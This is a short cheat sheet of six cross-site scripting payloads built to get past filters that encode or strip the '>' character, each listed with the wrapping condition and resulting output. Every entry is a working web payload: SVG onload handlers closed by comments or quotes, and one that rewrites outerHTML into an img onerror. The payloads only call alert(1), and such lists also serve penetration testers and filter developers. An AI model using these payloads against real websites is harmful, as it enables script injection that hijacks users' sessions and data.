1. XSS without Greater Than
- Payload: <svg onload=alert(1) 
- Condition: <opening_tag>{Payload}</closing_tag>
- Case: Greater Than > is encoded or removed
- Output: <opening_tag><svg onload=alert(1) </closing_tag>

---

2. XSS without Greater Than using JavaScript Comment
- Payload: <svg onload=alert(1)//
- Condition: <opening_tag>{Payload}</closing_tag>
- Case: Greater Than > is encoded or removed
- Output: <opening_tag><svg onload=alert(1)//</closing_tag>

---

3. XSS without Greater Than using HTML Comment
- Payload: <svg onload=alert(1)<!--
- Condition: <opening_tag>{Payload}</closing_tag>
- Case: Greater Than > is encoded or removed
- Output: <opening_tag><svg onload=alert(1)<!--</closing_tag>

---

4. XSS without Greater Than using Single Quotes
- Payload: <svg onload='alert(1)'
- Condition: <opening_tag>{Payload}</closing_tag>
- Case: Greater Than > is encoded or removed
- Output: <opening_tag><svg onload='alert(1)'</closing_tag>

---

5. XSS without Greater Than using Double Quotes
- Payload: <svg onload="alert(1)"
- Condition: <opening_tag>{Payload}</closing_tag>
- Case: Greater Than > is encoded or removed
- Output: <opening_tag><svg onload="alert(1)"</closing_tag>

---

6. XSS without Greater Than using HTML DOM Reflection
- Payload: <svg onload=outerHTML=id id=<img/src/onerror=alert(1)&gt;
- Condition: <opening_tag>{Payload}</closing_tag>
- Case: Greater Than > is encoded or removed
- Output: <opening_tag><img/src/onerror=alert(1)></closing_tag>
